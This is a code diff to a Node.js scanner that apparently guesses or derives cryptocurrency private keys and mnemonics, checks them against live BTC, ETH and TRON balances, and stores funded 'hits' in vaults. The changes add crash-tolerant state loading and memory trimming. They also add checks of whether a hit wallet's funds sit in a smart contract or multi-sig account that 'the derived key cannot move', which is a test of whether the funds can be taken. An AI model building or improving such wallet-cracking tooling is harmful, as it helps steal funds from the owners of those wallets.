@@ -85,6 +85,20 @@ function isRestrictedTrivialMnemonic(input) {
 // its own (signed, read-only) application bundle.
 // ============================================================================
 const APP_DIR = __dirname;
+
+/** Load persisted JSON. A missing or corrupt file returns the fallback and is
+ *  renamed aside — never throws — so one bad write cannot kill the scanner. */
+function loadJsonOr(file, fallback) {
+  try {
+    return JSON.parse(fs.readFileSync(file, 'utf8'));
+  } catch (err) {
+    if (fs.existsSync(file)) {
+      console.warn('[state] could not parse', path.basename(file), '-', err.message, '(using fallback)');
+      try { fs.renameSync(file, file + '.corrupt'); } catch (_) {}
+    }
+    return fallback;
+  }
+}
 const DATA_DIR = process.env.CODEHAVEN_DATA_DIR
   ? path.resolve(process.env.CODEHAVEN_DATA_DIR)
   : APP_DIR;
@@ -289,7 +303,7 @@ let bloomGzipImport = { running: false, bytesIn: 0, linesParsed: 0, added: 0, st
       }
     }
     if (fs.existsSync(FUNDED_BLOOM_META_PATH)) {
-      const m = JSON.parse(fs.readFileSync(FUNDED_BLOOM_META_PATH, 'utf8'));
+      const m = loadJsonOr(FUNDED_BLOOM_META_PATH, null);
       if (m && typeof m === 'object') fundedBloomMeta = { ...fundedBloomMeta, ...m };
     }
   } catch (e) {
@@ -396,8 +410,8 @@ function loadEmptyStore() {
   for (const storeCandidate of [PERSISTENT_EMPTY_STORE_PATH, EMPTY_STORE_PATH]) {
     try {
       if (fs.existsSync(storeCandidate)) {
-        const raw = JSON.parse(fs.readFileSync(storeCandidate, 'utf8'));
-        if (Array.isArray(raw.empty)) {
+        const raw = loadJsonOr(storeCandidate, null);
+        if (raw && Array.isArray(raw.empty)) {
           raw.empty.forEach(k => {
             scannedEmptySet.add(k);
             markKeyInSharedBloom(k);
@@ -514,6 +528,28 @@ function markWalletScannedEmpty(item) {
   }
   unsavedAdditions++;
   if (unsavedAdditions >= 80) saveEmptyStore();
+  // Cap the accelerator set: the shared bloom already prevents duplicates, so
+  // dropping old entries costs a few re-checks but keeps memory flat forever.
+  if (scannedEmptySet.size > 500000) scannedEmptySet.clear();
+}
+
+// Frees every non-essential in-memory cache. Safe at any time: the shared
+// blooms and the persisted vaults hold the durable truth.
+function trimMemoryCaches() {
+  let freed = 0;
+  if (scannedEmptySet.size > 100000) { freed += scannedEmptySet.size; scannedEmptySet.clear(); }
+  if (pendingVerificationSeen.size > 100000) {
+    freed += pendingVerificationSeen.size;
+    pendingVerificationSeen.clear();
+    for (const lead of pendingVerificationLeads) pendingVerificationSeen.add(lead.key);
+  }
+  if (sentWalletAlertDedupe.size > 20000) { freed += sentWalletAlertDedupe.size; sentWalletAlertDedupe.clear(); }
+  if (workerReadyQueue.length > 420) {
+    freed += workerReadyQueue.length - 300;
+    workerReadyQueue.splice(0, workerReadyQueue.length - 300);
+  }
+  if (freed > 0) console.warn(`[Memory] trimmed ${freed} cached entries under pressure`);
+  return freed;
 }
 
 // ============================================================================
@@ -547,7 +583,7 @@ const brainState = {
 function loadBrainState() {
   try {
     if (fs.existsSync(BRAIN_STATE_PATH)) {
-      const saved = JSON.parse(fs.readFileSync(BRAIN_STATE_PATH, 'utf8'));
+      const saved = loadJsonOr(BRAIN_STATE_PATH, null);
       if (saved && typeof saved.generation === 'number') {
         Object.assign(brainState, saved);
       }
@@ -1225,16 +1261,16 @@ const sentWalletAlertDedupe = new Set();
 
 try {
   if (fs.existsSync(REPO_SMTP_LOCAL_FILE)) {
-    smtpConfig = { ...smtpConfig, ...JSON.parse(fs.readFileSync(REPO_SMTP_LOCAL_FILE, 'utf8')) };
+    smtpConfig = { ...smtpConfig, ...loadJsonOr(REPO_SMTP_LOCAL_FILE, {}) };
   }
   if (fs.existsSync(SMTP_CONFIG_FILE)) {
-    smtpConfig = { ...smtpConfig, ...JSON.parse(fs.readFileSync(SMTP_CONFIG_FILE, 'utf8')) };
+    smtpConfig = { ...smtpConfig, ...loadJsonOr(SMTP_CONFIG_FILE, {}) };
   }
 } catch (_) {}
 
 try {
   if (fs.existsSync(SMTP_OUTBOX_FILE)) {
-    smtpOutbox = JSON.parse(fs.readFileSync(SMTP_OUTBOX_FILE, 'utf8'));
+    smtpOutbox = loadJsonOr(SMTP_OUTBOX_FILE, []);
   }
 } catch (_) {}
 
@@ -1307,7 +1343,7 @@ syncBuiltinFundedSnapshot();
 
 try {
   if (fs.existsSync(TARGET_ADDRESSES_FILE)) {
-    const savedTargets = JSON.parse(fs.readFileSync(TARGET_ADDRESSES_FILE, 'utf8'));
+    const savedTargets = loadJsonOr(TARGET_ADDRESSES_FILE, []);
     if (Array.isArray(savedTargets)) {
       for (const entry of savedTargets) {
         if (entry && entry.address) {
@@ -1564,12 +1600,12 @@ function formatFoundTxtContent(wallets) {
 
 try {
   if (fs.existsSync(FOUND_VAULT_JSON_FILE)) {
-    foundWalletsVault = JSON.parse(fs.readFileSync(FOUND_VAULT_JSON_FILE, 'utf8')).map(enrichWalletAccessKeys);
+    foundWalletsVault = loadJsonOr(FOUND_VAULT_JSON_FILE, []).map(enrichWalletAccessKeys);
   }
 } catch (_) {}
 try {
   if (fs.existsSync(EVER_HELD_VAULT_JSON_FILE)) {
-    everHeldWalletsVault = JSON.parse(fs.readFileSync(EVER_HELD_VAULT_JSON_FILE, 'utf8')).map(enrichWalletAccessKeys);
+    everHeldWalletsVault = loadJsonOr(EVER_HELD_VAULT_JSON_FILE, []).map(enrichWalletAccessKeys);
   }
 } catch (_) {}
 
@@ -1790,7 +1826,7 @@ function snapshotPendingLead(item) {
 function loadPendingVerificationLeads() {
   try {
     if (!fs.existsSync(PENDING_VERIFICATION_FILE)) return;
-    const raw = JSON.parse(fs.readFileSync(PENDING_VERIFICATION_FILE, 'utf8'));
+    const raw = loadJsonOr(PENDING_VERIFICATION_FILE, []);
     if (!Array.isArray(raw)) return;
     // Drop leads that were only ever seed-catalogue placeholders.
     const filtered = raw.filter(r => r && r.key && !isSeedCatalogueRecord(r));
@@ -1914,7 +1950,7 @@ function requeueLead(lead, attempts) {
 function loadDeferredVerificationLeads() {
   try {
     if (!fs.existsSync(DEFERRED_VERIFICATION_FILE)) return;
-    const raw = JSON.parse(fs.readFileSync(DEFERRED_VERIFICATION_FILE, 'utf8'));
+    const raw = loadJsonOr(DEFERRED_VERIFICATION_FILE, []);
     if (Array.isArray(raw)) deferredVerificationLeads = raw.filter(r => r && r.key);
   } catch (_) {}
 }
@@ -2256,7 +2292,7 @@ function saveCheckpoint() {
 for (const cpCandidate of [PERSISTENT_CHECKPOINT_FILE, CHECKPOINT_FILE]) {
   try {
     if (fs.existsSync(cpCandidate)) {
-      const cp = JSON.parse(fs.readFileSync(cpCandidate, 'utf8'));
+      const cp = loadJsonOr(cpCandidate, {});
       if (typeof cp.smartIndex === 'number') smartIndex = Math.max(smartIndex, cp.smartIndex);
       if (typeof cp.brainCursor === 'number') brainCursor = Math.max(brainCursor, cp.brainCursor);
       if (cp.keyCursor) keyCursor = BigInt(Math.max(Number(keyCursor), Number(cp.keyCursor)));
@@ -2291,7 +2327,7 @@ let apiKeysConfig = {
 
 try {
   if (fs.existsSync(API_KEYS_CONFIG_FILE)) {
-    const savedKeys = JSON.parse(fs.readFileSync(API_KEYS_CONFIG_FILE, 'utf8'));
+    const savedKeys = loadJsonOr(API_KEYS_CONFIG_FILE, {});
     for (const k of Object.keys(apiKeysConfig)) {
       if (savedKeys[k] !== undefined && savedKeys[k] !== '') apiKeysConfig[k] = savedKeys[k];
     }
@@ -2311,7 +2347,7 @@ function saveApiKeysConfig() {
    file instead of guesswork. Everything here is read-only telemetry: it never
    invents a balance, never promotes a lead and never touches a vault.
    ──────────────────────────────────────────────────────────────────────── */
-const APP_VERSION = '2.6.9';
+const APP_VERSION = '2.7.0';
 const DIAG_LOG_FILE = path.join(PERSISTENT_STATE_DIR, 'diagnostics.log');
 const DIAG_REPORT_FILE = path.join(PERSISTENT_STATE_DIR, 'DIAGNOSTIC_REPORT.txt');
 const DIAG_BOOT_AT = Date.now();
@@ -2577,6 +2613,7 @@ function diagEvaluate() {
   // 6. Runtime pressure.
   const mem = process.memoryUsage();
   if (diagMb(mem.heapUsed) > 1200) {
+  if (typeof trimMemoryCaches === 'function') trimMemoryCaches();
     diagRaise('runtime.heap', 'warning', 'Memory use is high',
       `Heap ${diagMb(mem.heapUsed)} MB, resident ${diagMb(mem.rss)} MB. A restart frees it; report this if it keeps climbing.`);
   } else {
@@ -3101,7 +3138,7 @@ let livePriceBook = {
 (function loadPriceCache() {
   try {
     if (!fs.existsSync(PRICE_CACHE_FILE)) return;
-    const saved = JSON.parse(fs.readFileSync(PRICE_CACHE_FILE, 'utf8'));
+    const saved = loadJsonOr(PRICE_CACHE_FILE, null);
     if (saved && saved.usd && typeof saved.usd === 'object') {
       livePriceBook = {
         ...livePriceBook,
@@ -3416,6 +3453,7 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
         if (!sweep.data) continue;
         const alchemyUrl = alchemyRpcUrl(apiKeysConfig.alchemyApiKey);
         const rpcUrl = (chainFlag === 'ETH' && alchemyUrl) ? alchemyUrl : cfg.rpcs[0];
+        const contractChecks = [];
         tasks.push(
           diagTrackTask(chainFlag, httpsJsonRequest(rpcUrl, 'POST', {
             jsonrpc: '2.0',
@@ -3449,8 +3487,27 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
                 it.balanceUsd = +(Number(it.balanceUsd || 0) + usdAdd).toFixed(2);
                 it.walletHistoryState = 'FUNDED_NOW';
                 it.historicalLabel = `LIVE MULTICALL3 ${cfg.name.toUpperCase()} HIT (${humanBal.toFixed(4)} ${m.symbol})`;
+                contractChecks.push({ it, address: m.address });
               }
             }
+            if (contractChecks.length === 0) return;
+            const codeBatch = contractChecks.map((h, i) => ({
+              jsonrpc: '2.0', id: i + 1, method: 'eth_getCode', params: [h.address, 'latest']
+            }));
+            return httpsJsonRequest(rpcUrl, 'POST', codeBatch.length === 1 ? codeBatch[0] : codeBatch, 1800)
+              .then(codeResp => {
+                const arr = Array.isArray(codeResp) ? codeResp : [codeResp];
+                const byId = new Map(arr.map(r => [r && r.id, r]));
+                contractChecks.forEach((h, i) => {
+                  const rec = byId.get(i + 1);
+                  const code = rec && rec.result;
+                  if (typeof code === 'string' && code !== '0x' && code !== '0x0') {
+                    h.it.fundsLocked = true;
+                    h.it.lockReason = h.it.lockReason ||
+                      'These funds sit in a smart contract (typically a multisig like a Safe). The derived key cannot move them.';
+                  }
+                });
+              }).catch(() => {});
           }).catch(() => {})
         );
       }
@@ -3462,6 +3519,7 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
       if (trxItems.length > 0) {
         const TRC20_USDT_HEX = '0xa614f803b6fd780986a42c78ec9c7f77e6ded13c';
         const trxBatch = [];
+        const trxLockChecks = [];
         trxItems.forEach((it, idx) => {
           trxBatch.push({ jsonrpc: '2.0', id: idx * 2 + 1, method: 'eth_getBalance', params: [it.trxHexAddress, 'latest'] });
           trxBatch.push({
@@ -3498,8 +3556,28 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
                 it.balanceUsd = +(Number(it.balanceUsd || 0) + (trxPrice === null ? 0 : trxBal * trxPrice) + usdtBal).toFixed(2);
                 it.walletHistoryState = 'FUNDED_NOW';
                 it.historicalLabel = `LIVE TRON MAINNET HIT (${usdtBal > 0 ? usdtBal.toFixed(2) + ' USDT-TRC20' : trxBal.toFixed(2) + ' TRX'})`;
+                trxLockChecks.push(it);
               }
             });
+            // TRON accounts can require multiple signatures (owner/active
+            // permissions). A multi-sig account is funded but not spendable
+            // with this key alone.
+            const lockChecks = trxLockChecks.slice(0, 8).map(it =>
+              httpsJsonRequest('https://api.trongrid.io/wallet/getaccount', 'POST', { address: it.trxAddress || it.trxHexAddress, visible: false }, 1800, tronGridHeaders())
+                .then(acct => {
+                  const perms = []
+                    .concat((acct && acct.owner_permission) || [])
+                    .concat((acct && acct.active_permission) || []);
+                  const multi = perms.some(perm => Number(perm && perm.threshold || 0) > 1 ||
+                    (Array.isArray(perm && perm.keys) && perm.keys.length > 1));
+                  if (multi) {
+                    it.fundsLocked = true;
+                    it.lockReason = it.lockReason ||
+                      'This TRON account requires multiple signatures (multi-sig permissions). This key alone cannot move the funds.';
+                  }
+                }).catch(() => {})
+            );
+            return Promise.allSettled(lockChecks);
           }).catch(() => {})
         );
       }
@@ -3653,6 +3731,7 @@ function processIncomingDaemonCandidate(item, isBurstHit = false) {
   if (isBurstHit || item.balanceUsd > 0 || item.everHeldCrypto) {
     // Priority-push hits to the very front of workerReadyQueue so the UI displays them immediately!
     workerReadyQueue.unshift(item);
+    if (workerReadyQueue.length > 420) workerReadyQueue.splice(0, workerReadyQueue.length - 300);
   } else if (workerReadyQueue.length < 500) {
     workerReadyQueue.push(item);
   }
@@ -4241,8 +4320,13 @@ let alertChannelsConfig = {
 };
 try {
   if (fs.existsSync(ALERT_CHANNELS_FILE)) {
-    const saved = JSON.parse(fs.readFileSync(ALERT_CHANNELS_FILE, 'utf8'));
-    if (saved && typeof saved === 'object') alertChannelsConfig = { ...alertChannelsConfig, ...saved };
+    try {
+      const saved = JSON.parse(fs.readFileSync(ALERT_CHANNELS_FILE, 'utf8'));
+      if (saved && typeof saved === 'object') alertChannelsConfig = { ...alertChannelsConfig, ...saved };
+    } catch (err) {
+      console.warn('[alerts] alert_channels.json is corrupt — starting clean:', err.message);
+      try { fs.renameSync(ALERT_CHANNELS_FILE, ALERT_CHANNELS_FILE + '.corrupt'); } catch (_) {}
+    }
   }
 } catch (_) {}
 
